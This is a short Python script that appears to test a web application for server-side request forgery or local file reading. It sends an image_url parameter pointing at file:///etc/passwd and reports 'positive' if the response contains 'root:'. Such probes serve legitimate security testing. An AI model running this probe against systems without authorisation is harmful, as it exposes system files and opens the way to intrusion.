import requests
import sys

url = sys.argv[1]

param = "file:///etc/passwd"

baseUrl = url.split('?')

testUrl = baseUrl[0] + "?image_url=" + param

response = requests.get(testUrl)

if 'root:' in response.text:
    print('positive')
else:
    print('negative')